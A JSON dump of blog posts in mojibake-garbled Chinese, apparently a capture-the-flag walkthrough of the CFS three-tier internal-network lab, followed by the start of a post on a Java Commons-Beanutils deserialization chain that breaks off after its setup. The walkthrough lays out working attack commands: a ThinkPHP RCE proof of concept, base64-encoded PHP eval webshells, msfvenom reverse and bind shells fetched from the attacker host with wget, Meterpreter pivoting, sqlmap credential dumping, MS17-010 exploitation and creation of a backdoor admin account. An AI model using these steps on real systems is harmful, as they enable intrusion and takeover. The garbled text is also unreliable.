{"posts":[{"title":"CFSä¸‰å±‚é¶æœº-å†…ç½‘ç¯å¢ƒæ¸—é€","text":"&lt;1&gt;é¶åœºä»‹ç»åŠç¯å¢ƒé…ç½®ä¸‰ä¸ªä¸»æœºçš„ç½‘ç»œç¯å¢ƒæ‹“æ‰‘å›¾ï¼Œæ”»å‡»æœºçš„ç½‘æ®µåœ¨192.168.236.0/24ï¼Œä¸‰å°é¶æœºçš„IPåœ°å€åˆ†åˆ«å¦‚å›¾ï¼š ä¸Šé¢çš„ Target1ã€2ã€3åˆ†åˆ«å¯¹åº”CentOS7ã€Ubuntuã€Windows7 ä¸‰å°ä¸»æœºã€‚ (1)ç½‘å¡é…ç½®æ³¨æ„ï¼šåœ¨ç¼–è¾‘è™šæ‹Ÿç½‘å¡çš„æ—¶å€™ï¼Œä¸è¦å‹¾é€‰çº¢åœˆé‚£ä¸ªé€‰é¡¹ï¼Œå¦åˆ™åé¢ä»£ç†å°±å°±æ²¡æœ‰æ„ä¹‰äº†ã€‚.ovaæ–‡ä»¶å¯¼å…¥åˆ°VMä¹‹åå¯ä»¥æ‰“å¼€è™šæ‹Ÿæœºï¼Œä½¿ç”¨root:teamssix.comç™»å½•ä¸»æœºï¼Œé€šè¿‡ifconfigæ£€æŸ¥ç½‘ç»œæƒ…å†µæ˜¯å¦æ­£å¸¸ã€‚ (2)å®å¡”é…ç½®å…¶ä¸­Target1å’ŒTarget2ä¸»æœºéœ€è¦æˆ‘ä»¬è‡ªå·±å»å®å¡”åå°é…ç½®ä¸€ä¸‹ï¼ˆé¶æœºæè¿°ä¿¡æ¯é‡Œæœ‰å¯†ç  root:teamssix.comï¼‰ï¼šè¿›å…¥å®å¡”é¢æ¿ï¼Œé€‰æ‹©ç½‘ç«™ï¼Œå†ç‚¹å‡»ç½‘ç«™åï¼Œå°†centosé¶æœºä¸­cæ®µä¸º236çš„é‚£ä¸ªipæ·»åŠ è¿›å»ï¼Œç¡®ä¿èƒ½å¤Ÿè®¿é—®åˆ°å¯¹åº”çš„webé¡µé¢ &lt;2&gt;Target1(1)nmapæ‰«æå­˜æ´»ä¸»æœº1234567891011121314151617181920212223242526#æ‰«ææ®µå†…å­˜æ´»ä¸»æœºâ”Œâ”€â”€(rootã‰¿kali)-[~]â””â”€# nmap -sP 192.168.236.0/24 Nmap scan report for 192.168.236.141 (192.168.236.141)Host is up (0.00019s latency).#nmapæ‰«æä¸€ä¸‹ Target1 å¼€æ”¾çš„æœåŠ¡â”Œâ”€â”€(rootã‰¿kali)-[~]â””â”€# nmap -A -p 1-65535 192.168.236.141Nmap scan report for 192.168.236.141 (192.168.236.141)Host is up (0.00082s latency).Not shown: 65528 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp Pure-FTPd22/tcp open ssh OpenSSH 7.4 (protocol 2.0)80/tcp open http nginx111/tcp open rpcbind 2-4 (RPC #100000)888/tcp open http nginx3306/tcp open mysql MySQL (unauthorized)8888/tcp open http Ajenti http control panelMAC Address: 00:0C:29:61:BA:F8 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop å¯ä»¥çœ‹è§å¼€æ”¾äº† 21ã€22ã€80ã€111ç­‰ç­‰ç«¯å£ï¼Œæˆ‘ä»¬è®¿é—®ä¸€ä¸‹80çš„httpæœåŠ¡è®¿é—®192.168.236.141 ç«™ç‚¹ä¸å­˜åœ¨ï¼Œ192.168.236.141/index.php 404 æ˜¯å› ä¸ºå®å¡”åå°é…ç½®çš„åŸå› ï¼ŒæŒ‰ç…§å‰é¢æåˆ°çš„å®å¡”é…ç½®ä¹‹åå°±ä¸ä¼šå‡ºç°è¿™ä¸ªæƒ…å†µã€‚ (2)åˆ©ç”¨thinkphp-5.0.22 RCEæ¼æ´æ‹¿shellè®¿é—®80ç«¯å£å¼€æ”¾çš„httpæœåŠ¡ è®¿é—®åå‘ç°è¿™æ˜¯ä¸€ä¸ªç”¨thinkphp5ç‰ˆæœ¬æ­å»ºçš„ç½‘ç«™ï¼Œthinkphp5ç‰ˆæœ¬æ˜¯æœ‰æ¼æ´çš„ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥ä¸ŠthinkphpGUIå·¥å…·ï¼Œæ£€æµ‹ä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨ThinkPHP 5.0.22/5.1.29 RCE 1pocä¸ºï¼šhttp://192.168.236.141/index.php/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 ç›´æ¥GetShellæ²¡é€šï¼Œæ— ä¼¤å¤§é›…ï¼Œé‚£æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤å»ç”Ÿæˆä¸€ä¸ªä¸€å¥è¯æœ¨ğŸ(æ‰§è¡Œåå¼¹shellå‘½ä»¤ä¹Ÿå¯) 1echo &quot;&lt;?php eval($_POST['1vxyz']); ?&gt;&quot; &gt; shell.php ä½†æ˜¯èšå‰‘è¿æ¥å¤±è´¥ï¼ŒæŸ¥çœ‹ä¸€ä¸‹shell.php å‘ç°å†…å®¹ä¸­$_POSTè¢«è¿‡æ»¤äº† è¿™ä¸ªå¥½è¯´ï¼Œbase64åŠ å¯†ç»•è¿‡ 1echo &quot;PD9waHAgZXZhbCgkX1BPU1RbJzF2eHl6J10pOyA/Pg==&quot; | base64 -d &gt; shell.php æˆåŠŸå†™å…¥ä¸€å¥è¯æœ¨ğŸï¼Œèšå‰‘è¿æ¥åœ¨ flag21sA.txtå’Œrobots.txt å¾—åˆ°äº†ä¸¤ä¸ªflag æ‹¿åˆ°shellä¹‹åï¼Œæ‰§è¡Œifconfigï¼Œå‘ç°äº†å¦ä¸€ä¸ª22ç½‘æ®µipï¼š192.168.22.130ã€‚è‚¯å®šå°±å­˜åœ¨å†…ç½‘äº† (3)ä¸Šä¼ msfåé—¨(reverse_tcp)åå‘è¿æ¥æ‹¿ä¸»æœºæƒé™æ—¢ç„¶å­˜åœ¨å†…ç½‘ï¼Œé‚£å°±è¦æ‹¿å‡ºæ¥æˆ‘ä»¬çš„msfç¾å°‘å¦‡å·¥å…·äº†é¦–å…ˆåˆ©ç”¨ msfevnom ç”Ÿæˆä¸€ä¸ªmsfåé—¨ï¼Œå³elfçš„ğŸ 12345678910111213141516171819# ç”Ÿæˆmsfåé—¨ å…¶ä¸­lhostä¸ºkali_ipmsfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.236.128 lport=4444 -f elf &gt; shell.elf#kalié‡Œpythonå¼€ä¸€ä¸ªhttpæœåŠ¡ ç”¨äºèšå‰‘ wgetä¸‹è½½ msfåé—¨python -m http.server 8888# èšå‰‘è¿›å…¥åˆ°å¯ä»¥ä¸‹è½½æ–‡ä»¶çš„ /tmpç›®å½•wget http://192.168.236.128:8888/shell.elf# èµ‹äºˆæ‰§è¡Œæƒé™chmod +x shell.elf#åœ¨kaliä¸­è¿è¡Œç›‘å¬æ¨¡å—root@kali:~# msfconsolemsf6 &gt; use exploit/multi/handlermsf6 &gt; set payload linux/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set lhost 192.168.236.128msf6 exploit(multi/handler) &gt; set lport 4444msf6 exploit(multi/handler) &gt; run#ç„¶åå›åˆ°èšå‰‘ /tmpä¸‹ ./æ‰§è¡Œ elfæœ¨é©¬./shell.elf åˆ°è¿™é‡Œæˆ‘ä»¬çš„Target1ï¼šcentosé¶æœºå·²ç»ä¸Šçº¿ msf äº†ï¼Œä¸‹é¢å¼€å§‹å†…ç½‘æ¸—é€ &lt;3&gt;Target2ç°åœ¨è¿˜ä¸èƒ½ç›´æ¥å»nmapæ‰«æå†…ç½‘é‡Œçš„ubuntué¶æœºipï¼Œå› ä¸ºæˆ‘ä»¬çš„ç½‘æ®µè®¾ç½®ï¼Œè¿™é‡Œæ‰«ææ˜¯ç”¨çš„kaliçš„ipæ‰«æï¼Œæ¨¡æ‹Ÿçš„ç¯å¢ƒä¸­kaliå’Œcentosæ˜¯NATä¸‹çš„åŒä¸€ä¸ªç½‘æ®µçš„å…¬ç½‘ä¸»æœºï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ‰«åˆ°ï¼Œè€Œç°åœ¨æ‰«çš„å±äºå†…ç½‘ç½‘æ®µã€‚ ä½†æ˜¯æˆ‘ä»¬çŸ¥é“åˆšæ‰“ä¸‹çš„centosæ˜¯å†…ç½‘é‡Œçš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŒ‚ä¸Šcentosé¶æœºçš„ä»£ç†ã€‚ (1)è·¯ç”±ä¿¡æ¯æ¢æµ‹æˆ‘ä»¬ä½¿ç”¨msfè‡ªå¸¦çš„ æ¢æµ‹ç½‘ç»œæ¥å£çš„æ¨¡å—ï¼ˆget_local_subnetsï¼‰æŸ¥çœ‹è·¯ç”±çš„æ¨¡å—(autoroute -p)æ¥è¿›ä¸€æ­¥è¿›è¡Œä¿¡æ¯æ¢æµ‹ 123456789# è·å–æœ¬åœ°æ‰€åœ¨å­ç½‘ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨22ç½‘æ®µmeterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Local subnet: 192.168.22.0/255.255.255.0Local subnet: 192.168.236.0/255.255.255.0# æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ï¼Œä¼šå‘ç°è¿˜æ²¡æœ‰è·¯ç”±meterpreter &gt; run autoroute -p[*] No routes have been added yet è·¯ç”±ï¼šè·¯ç”±æ˜¯æŒ‡è·¯ç”±å™¨ä»ä¸€ä¸ªæ¥å£ä¸Šæ”¶åˆ°æ•°æ®åŒ…ï¼Œæ ¹æ®æ•°æ®åŒ…çš„ç›®çš„åœ°å€è¿›è¡Œå®šå‘å¹¶è½¬å‘åˆ°å¦ä¸€ä¸ªæ¥å£çš„è¿‡ç¨‹ï¼Œå°±ç›¸å½“äºæŠŠæˆ‘ä»¬è¦ä¼ è¾“çš„æ•°æ®å…ˆä¼ è¾“åˆ°è¯¥è·¯ç”±ï¼Œå†å‘å¾€ç›®æ ‡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®è·¯ç”±çš„æ–¹å¼æŠŠæˆ‘ä»¬çš„è¯·æ±‚ä»centosç½‘æ®µå‘å‡ºï¼Œè¿™æ ·msfä¸å°±å¯ä»¥ä¸22ç½‘æ®µäº’é€šæœ‰æ— äº†å—ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ¥æ·»åŠ ä¸€ä¸ªè·¯ç”±(autoroute -s) é™æ€è·¯ç”±é…ç½® MSF çš„ autoroute æ¨¡å—æ˜¯ MSF æ¡†æ¶ä¸­è‡ªå¸¦çš„ä¸€ä¸ªè·¯ç”±è½¬å‘åŠŸèƒ½ï¼Œå®ç°è¿‡ç¨‹æ˜¯ MSF æ¡†æ¶åœ¨å·²ç»è·å–çš„ Meterpreter Shell çš„åŸºç¡€ä¸Šæ·»åŠ ä¸€æ¡å»å¾€â€œå†…ç½‘â€çš„è·¯ç”±ï¼Œç›´æ¥ä½¿ç”¨ MSF å»è®¿é—®åŸæœ¬ä¸èƒ½ç›´æ¥è®¿é—®çš„å†…ç½‘èµ„æºï¼Œåªè¦è·¯ç”±å¯è¾¾æˆ‘ä»¬æ—¢å¯ä½¿ç”¨ MSF æ¥è¿›è¡Œæ¢æµ‹äº† 12345#é€šè¿‡meterpreteræ·»åŠ 22ç½‘æ®µçš„è·¯ç”±ä¿¡æ¯ï¼Œè¿™æ ·kaliä¸centoså°±å¯ä»¥äº’é€šäº†run autoroute -s 192.168.22.0/24run autoroute -p#è¿™ä¸€æ­¥ä¹Ÿå¯ä»¥ä½¿ç”¨run post/multi/manage/autorouteè‡ªåŠ¨æ·»åŠ è·¯ç”±run post/multi/manage/autoroute (2)msfçš„ä»£ç†é…ç½®è·¯ç”±è¿˜æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œå®ƒåªèƒ½åœ¨è¿™ä¸ªmsfå»ºç«‹çš„ä¼šè¯ä¸Šä½¿ç”¨ï¼Œå‡å¦‚æˆ‘ä»¬æ–°å¼€ä¸€ä¸ªç»ˆç«¯ä½¿ç”¨nmapæ‰«æï¼Œè¿˜æ˜¯æ‰«ä¸åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»è¿›è¡Œ msfçš„ä»£ç†é…ç½®ã€‚ msfæœ‰è‡ªå·±çš„ä»£ç†æ¨¡å—ï¼Œå°±æ˜¯ auxiliary/server/socks_proxy ï¼Œæˆ‘ä»¬å…ˆæ¥å¼€å¯ä»£ç†æœåŠ¡ï¼Œsrvportç«¯å£éšä¾¿ï¼Œæ²¡è¢«å ç”¨å°±è¡Œ 1234567# å…ˆåˆ‡åˆ°æ§åˆ¶å°background# é…ç½®socks5ä»£ç†msf6 &gt; use auxiliary/server/socks_proxymsf6 auxiliary(server/socks_proxy) &gt; show optionsmsf6 auxiliary(server/socks_proxy) &gt; set srvport 2222msf6 auxiliary(server/socks_proxy) &gt; run åœ¨kaliä¸­ï¼Œé€šè¿‡vim /etc/proxychains4.confä¿®æ”¹proxychainsé…ç½®æ–‡ä»¶ï¼š å†™å…¥ï¼š kaliçš„ipå’Œåˆšåˆšè®¾ç½®çš„ç«¯å£ 1socks5 192.168.236.128 2222 æ‰«æé¶æœº2 ubuntuçš„ipåŠå…¶æœåŠ¡ å¯ä»¥ç”¨nmapæ‰«æå­˜æ´»ä¸»æœºï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨msfè¿›è¡Œç¬¬äºŒå±‚ç½‘ç»œå­˜æ´»ä¸»æœºæ‰«æï¼š use auxiliary/scanner/discovery/arp_sweep 123root@kali:~# proxychains4 nmap -Pn -sT 192.168.22.129 -p80-Pnï¼šæ‰«æä¸»æœºæ£€æµ‹å…¶æ˜¯å¦å—åˆ°æ•°æ®åŒ…è¿‡æ»¤è½¯ä»¶æˆ–é˜²ç«å¢™çš„ä¿æŠ¤ã€‚-sTï¼šæ‰«æTCPæ•°æ®åŒ…å·²å»ºç«‹çš„è¿æ¥connect èƒ½æ¢æµ‹ä¹Œç­å›¾çš„ç«¯å£ï¼Œè¯´æ˜ä»£ç†é…ç½®æˆåŠŸï¼ˆå‰é¢çš„ç»ˆç«¯é¡µé¢éƒ½ä¸è¦å…³ï¼Œè·¯ç”±å¿…é¡»è®¾ç½®æ‰å¯ä»¥æˆåŠŸï¼‰ è®¿é—®80ç«¯å£å¼€æ”¾çš„httpæœåŠ¡ï¼Œè®¾ç½®å¥½æµè§ˆå™¨ä»£ç†åï¼Œè®¿é—®çœ‹çœ‹ æ˜¾ç¤ºç«™ç‚¹ä¸å­˜åœ¨ï¼Œubuntuè¿™ä¸ªé¶æœºä¹Ÿéœ€è¦å»å®å¡”ï¼ŒæŠŠcæ®µä¸º22çš„ 192.168.236.129æ·»åŠ è¿›å» (3)åˆ©ç”¨bagecms-sqlæ³¨å…¥æ¼æ´,adminç™»å½•åå°æ‹¿shellé…ç½®å®Œæ¯•åè®¿é—®ï¼Œæ˜¯ä¸€ä¸ªbagecmsæ­å»ºçš„å¹³å° æºç ä¸­ç»™å‡ºäº†sqlæ³¨å…¥æç¤ºï¼šHintï¼šSQLæ³¨å…¥ç‚¹ï¼š/index.php?r=vul&amp;keyword=1/robots.txt ä¹Ÿç»™å‡ºäº†adminç™»å½•ç‚¹ ï¼š /admini é¶åœºï¼Œä¸ç”¨åœ¨æ„é‚£ä¹ˆå¤šï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­,å› ä¸ºéœ€è¦æŒ‚ä»£ç†æ‰èƒ½è®¿é—®åˆ°ï¼Œæ‰€ä»¥å‘½ä»¤å‰éœ€è¦åŠ ä¸Š proxychains4ï¼ŒåŒæ · sqlmapä¹Ÿå¯ä»¥ç”¨å‚æ•° â€“proxy=socks5://192.168.236.128:2222keywordä¸ºæ³¨å…¥ç‚¹ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ‰§è¡Œæ—¶åŠ ä¸Š -p keyword æ›´å¿«ä¸€ç‚¹ 1234567891011# çˆ†ä¸€ä¸‹æ•°æ®åº“åç§°proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p keyword --dbsæˆ–sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; --proxy=socks5://192.168.236.128:2222 -p keyword --dbs --batch# çˆ†ç ´ bagecms åº“ä¸‹çš„è¡¨proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p keyword -D &quot;bagecms&quot; --tables T &quot;bage_admin&quot; --batch# çˆ†ç ´ bage_admin è¡¨çš„å­—æ®µproxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p keyword -D &quot;bagecms&quot; -T &quot;bage_admin&quot; --columns --batch# æŠŠ adminçš„è´¦å·å¯†ç ç»™ dumpå‡ºæ¥proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin -C username,password --dump# æµ‹è¯•äº†--is-dbaï¼Œä¸æ˜¯é«˜æƒé™ï¼Œé‚£å°±ä¸å°è¯•--os-shelläº† æ‹¿åˆ°adminçš„è´¦å·å’Œå¯†ç  admin:123qwe ç™»å½•CMSçš„åå°çœ‹ä¸€çœ‹æœ‰äº›ä»€ä¹ˆï¼Œ/index.php?r=/admini/ åœ¨é¦–é¡µå°±å‘ç°äº†flag åœ¨æ¨¡æ¿ä¸€æ å¯ä»¥ä¿®æ”¹æ–‡ä»¶ï¼Œåœ¨ tag/index.php å†™å…¥ä¸€å¥è¯ğŸï¼š æäº¤ä¹‹åï¼Œæ‰“å¼€èšå‰‘ï¼Œè®¾ç½®ä»£ç† socks5ä¸º kaliipä¸º192.168.236.128 portä¸º2222 ä¹Ÿå¯ä»¥ç”¨ SockscapæŒ‚ä¸Šmsfå¼€å¯çš„socks5ä»£ç† åœ¨é‡Œé¢æ·»åŠ èšå‰‘ç¨‹åºæ‰“å¼€èšå‰‘ æ³¨æ„è¿™é‡Œçš„ç½‘å€ä½¿ç”¨çš„æ˜¯æ¨¡å—åŒ–ï¼Œä¸èƒ½ç›´æ¥åŠ åœ¨ç½‘ç«™ä¸Šï¼Œè¦ç”¨?r=æ¨¡å—æ–‡ä»¶ çš„æ–¹å¼è®¿é—®æ¨¡å—æ–‡ä»¶ï¼Œå†ç”¨èšå‰‘è¿æ¥ æµ‹è¯•è¿æ¥ï¼Œå†™å…¥æˆåŠŸ (3)ä¸Šä¼ msfåé—¨(bind_tcp)æ­£å‘è¿æ¥æ‹¿ubuntuä¸»æœºæƒé™ç„¶åå’Œå‰é¢target1å·®ä¸å¤šï¼Œmsfç”Ÿæˆåé—¨ï¼Œä¸Šä¼ åˆ°èšå‰‘ www/wwwroot/uploadé‚£ä¸ªç›®å½•ã€‚ä¸èƒ½é€šè¿‡wgetäº†ï¼Œå¥½åƒæ˜¯ä»£ç†è®¾ç½®çš„åŸå› ï¼Œæˆ‘æ˜¯ç›´æ¥kalié‡Œç”Ÿæˆï¼Œä¸‹è½½åˆ°windowsä¸Šï¼Œç„¶åä¸Šä¼ æ–‡ä»¶ä¸Šä¼ ä¸Šå»çš„ 123456# ç”Ÿæˆä¸€ä¸ªæ­£å‘è¿æ¥åé—¨ï¼ˆå› ä¸ºå†…ç½‘ä¸»æœºæ— æ³•ç›´æ¥ä¸æœ¬æœºé€šä¿¡ï¼Œå› æ­¤æ— æ³•å»ºç«‹åå‘è¿æ¥ï¼Œéœ€è¦æœ¬æœºé€šè¿‡ä»£ç†è¿æ¥åˆ°ç›®æ ‡æœºï¼‰# èšå‰‘ä¸­ uname -a å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ª64ä½çš„linuxç³»ç»Ÿmsfvenom -p linux/x64/meterpreter/bind_tcp lport=3333 -f elf &gt; shell2.elf# åé—¨ç¨‹åºä¸Šä¼ ä¹‹ååœ¨Webshellæ‰§è¡Œå‘½ä»¤chmod +x shell2.elf./shell2.elf åœ¨MSFä¸­å¼€å¯ç›‘å¬ï¼Œä¸Target2å»ºç«‹è¿æ¥ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œä¸Šä¸€æ¬¡ä»£ç†ä½¿ç”¨çš„reverse_tcpæ˜¯MSFä½œä¸ºç›‘å¬ï¼Œè®©Target1è¿åˆ°æˆ‘ä»¬ï¼Œè€Œè¿™æ¬¡ä»£ç†ä½¿ç”¨çš„bind_tcpæ˜¯Target2ä½œä¸ºç›‘å¬ï¼Œæˆ‘ä»¬éœ€è¦è¿åˆ°Target2ï¼Œè¿™ä¸ªé€»è¾‘æ­£å¥½æ˜¯ç›¸åçš„ åŒæ ·ï¼Œå¦‚æœæˆ‘ä»¬è¦ç”¨msf å¦èµ·ä¸€ä¸ªç»ˆç«¯å¼€å¯ç›‘å¬ï¼Œè¿™é‡Œè¦æ³¨æ„ï¼Œmsfæ–°å¼€çš„ç»ˆç«¯ä¹‹å‰çš„é‚£ä¸ªç»ˆç«¯çš„é…ç½®éƒ½ç”¨ä¸äº†ã€‚ ç„¶è€Œè¿™æ¬¡ä»£ç†ä½¿ç”¨çš„bind_tcpæ˜¯Target2ä½œä¸ºç›‘å¬ï¼Œæˆ‘ä»¬è¦æ­£å‘è¿æ¥åˆ°å†…ç½‘é‡Œçš„target2ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥msfconsoleæ‰“å¼€ï¼Œmsfè¿™é‡Œä¹Ÿéœ€è¦èµ°ä»£ç† ï¼Œå°±æ˜¯åœ¨ç”¨ proxychains msfconsoleæ¥å¯åŠ¨msfï¼Œå†è®¾ç½®payloadï¼Œè®¾ç½®rhost,lport run å³å¯å¼€å¯ç›‘å¬ â€¦â€¦æœ‰ç‚¹å¥—å¨ƒ å¯ä»¥å‚è€ƒè¿™ä¸ªå›¾å¥½ç†è§£ä¸€äº›ï¼š å®é™…ä¸Šç»§ç»­ç”¨é‚£ä¸ªç»ˆç«¯å°±è¡Œ 123456# æœ¬æœºMSFæ‰§è¡Œå‘½ä»¤use exploit/multi/handlerset payload linux/x64/meterpreter/bind_tcpset RHOST 192.168.22.129set LPORT 3333run 12345shell# è½¬åŒ–ä¸ºäº¤äº’å¼python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'# æŸ¥çœ‹ç½‘ç»œä¿¡æ¯ifconfig ä¿¡æ¯æœé›†ï¼Œifconfigçœ‹åˆ°äº†cæ®µä¸º33 çš„ipï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªå†…ç½‘ è¿˜æœ‰ä¸€å±‚å†…ç½‘ï¼Ÿ ç»§ç»­ msfï¼Œä¸‹é¢çš„æ“ä½œå°±æœ‰ç‚¹é‡å¤ä¹‹å‰çš„æ“ä½œäº† ç¡®å®šå†…ç½‘cæ®µ -&gt; msfæ·»åŠ è·¯ç”± &lt;4&gt;Target3(1)è·¯ç”±ä¿¡æ¯æ¢æµ‹ä¸ä¹‹å‰ä¸€æ ·ï¼Œæˆ‘ä»¬æ·»åŠ Target3çš„è·¯ç”±ï¼Œç”±äºè¿˜åœ¨é‚£ä¸ªç»ˆç«¯é‡Œï¼Œauxiliary/server/socks_proxyæ­£åœ¨æ‰§è¡Œï¼Œæ‰€ä»¥æ·»åŠ äº†æ–°è·¯ç”±ï¼Œä¹Ÿå°±å¯ä»¥è®¿é—®æ–°è·¯ç”±å†…ç½‘ï¼Œè¿™é‡Œå°±ä¸ç”¨è®¾ç½®ä»£ç†äº†ï¼Œç›´æ¥æ·»åŠ è·¯ç”±å³å¯ 123#é€šè¿‡meterpreteræ·»åŠ 33ç½‘æ®µçš„è·¯ç”±ä¿¡æ¯ï¼Œè¿™æ ·kaliä¸ubuntuå°±å¯ä»¥äº’é€šäº†run autoroute -s 192.168.33.0/24run autoroute -p nmapæ‰«æä¸€ä¸‹target3é¶æœºå¼€æ”¾çš„æœåŠ¡ èƒ½æ¢æµ‹ä¹Œç­å›¾çš„ç«¯å£ï¼Œè¯´æ˜ä»£ç†é…ç½®æˆåŠŸï¼ˆå‰é¢çš„ç»ˆç«¯é¡µé¢éƒ½ä¸è¦å…³ï¼Œè·¯ç”±å¿…é¡»è®¾ç½®æ‰å¯ä»¥æˆåŠŸï¼‰ (2)åˆ©ç”¨ms17-010æ°¸æ’ä¹‹è“æ¼æ´æ‹¿shellå¿…é¡»æ·»åŠ è·¯ç”±ã€‚ å¯ä»¥çœ‹åˆ° target3æ˜¯ å¼€æ”¾ç€445ã€3389ç«¯å£çš„Win7ç³»ç»Ÿï¼Œç†Ÿæ‚‰çš„æ°¸æ’ä¹‹è“ã€‚msfé‡Œç°æˆçš„ms17-010æ‰“ä¸€ä¸‹ 12345use exploit/windows/smb/ms17_010_psexecset payload windows/x64/meterpreter/bind_tcpset RHOSTS 192.168.33.33set LPORT 6666run ms17-010æ¼æ´åˆ©ç”¨æˆåŠŸï¼Œshellè¿›å…¥å‘½ä»¤è¡Œ 1netstat -ant å‘ç°ç½‘ç«™å¼€å¯äº†3389ï¼ŒåŒæ—¶æ˜¯systemæƒé™ï¼š è¿˜çœ‹è§äº†æˆ‘ä»¬çš„shellâ€¦. æŸ¥çœ‹è´¦æˆ·ï¼Œç›´æ¥ä¿®æ”¹è´¦æˆ·å¯†ç ã€‚åˆ©ç”¨3389è¿æ¥ æˆ–è€… æ·»åŠ ä¸€ä¸ªç”¨æˆ· 1234net user administrator 123456æˆ–net user /add 1vxyz 123456net localgroup administrators /add 1vxyz win+r mstsc æ‰“å¼€è¿œç¨‹æ¡Œé¢è¿æ¥ã€‚åœ¨SocksCapä¸­è¿è¡Œè¿æ¥è¿œç¨‹æ¡Œé¢ç¨‹åºmstsc.exeæ‰å¯ä»¥ï¼Œè¿™é‡Œæˆ‘ç”µè„‘ä¸Šæ²¡æ‰¾åˆ°ã€‚è¿˜æœ‰ä¸€ç§æ–¹æ³• portfwdç«¯å£è½¬å‘/æ˜ å°„ portfwd add -l 5555 -p 3389 -r 192.168.33.33 Win+r è¾“å…¥mstsc æœ€åçš„flagå°±åœ¨è¿™å°win7çš„æ¡Œé¢ä¸Šï¼Œè‡³æ­¤é¶åœºæ‰“ç©¿ï¼Œä¸‰ä¸ªflagæ‹¿åˆ° &lt;5&gt;æ€»ç»“ä»æœ€åˆçš„ä¸‹è½½é¶æœºï¼Œå¼€å¯ åˆ°ç°åœ¨ç»“æŸï¼Œæ–­æ–­ç»­ç»­ç»Ÿå…±èŠ±è´¹äº†å¾ˆå¤šä¸ªå°æ—¶ã€‚æœŸé—´ è¿å¼€å››å°è™šæ‹Ÿæœºï¼Œæœ‰ç”µè„‘å¡çš„è“å±åŠ¨ä¸äº†å…³æœºâ€¦ ä¹Ÿæœ‰å¯¹å®å¡”é…ç½®ã€å†…ç½‘çŸ¥è¯†çš„ä¸äº†è§£ï¼Œè·Ÿç€wpèµ°å´è®¿é—®ä¸äº†ã€‚è¿˜æœ‰é€”ä¸­ä¸æ–­è§£å†³é—®é¢˜æ—¶sessionä¸€ç›´æ‰ï¼Œæœ€åä¸€æ­¥çš„è¿œç¨‹æ¡Œé¢æ²¡æ‰“å¼€ç­‰ç­‰ã€‚åˆ°åé¢ä¸€æ­¥ä¸€æ­¥å•ƒå®Œï¼Œä¹Ÿæ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚ 0.0 æ¸—é€å°ç™½ç»ˆäºæ‰“ç ´ å¤©å¤©å¬è¯´å´ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œå®³æ€•æ²¡æè¿‡æä¸ä¸‹æ¥çš„æƒ³æ³•ï¼Œæ‰“ä¸‹äº†ç¬¬ä¸€ä¸ªç®€å•çš„å†…ç½‘é¶åœºã€‚åç»­æŠ½æ—¶é—´ç»§ç»­æ·±å…¥å­¦ä¹ ï¼Œä¸‡äº‹å¼€å¤´éš¾ï¼Œå¸Œæœ›æ˜¯ä¸€ä¸ªå¥½å…†å¤´ï¼ŒåŠ æ²¹ï¼ å­¦åˆ°ç”¨åˆ°çš„ä¸€äº›ä¸œè¥¿ï¼š thinkphp-GUIï¼Œsqlmapå·¥å…· msfåé—¨åˆ¶ä½œ &amp; msf æ­£å‘åå‘shell è·¯ç”±çš„æ¦‚å¿µ msfå†…ç½‘ä»£ç†æ¨¡å— &amp; sockscap64ä»£ç†å·¥å…· ms17-010æ¼æ´ è·³æ¿æ”»å‡»ä¹‹msf-portfwdç«¯å£è½¬å‘ 3389è¿œç¨‹æ¡Œé¢ç™»å½• å‚è€ƒï¼šå†…æœ‰é¶æœºç¯å¢ƒä¸‹è½½åœ°æ–¹","link":"/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/"},{"title":"Javaååºåˆ—åŒ–Commons-Beanutilsç¯‡-CBé“¾","text":"&lt;1&gt; ç¯å¢ƒä»‹ç»jdkï¼šjdk8u65CBï¼šcommons-beanutils 1.8.3pom.xml æ·»åŠ  12345678910&lt;dependency&gt; &lt;groupId&gt;commons-beanutils&lt;/groupId&gt; &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt; &lt;version&gt;1.8.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; 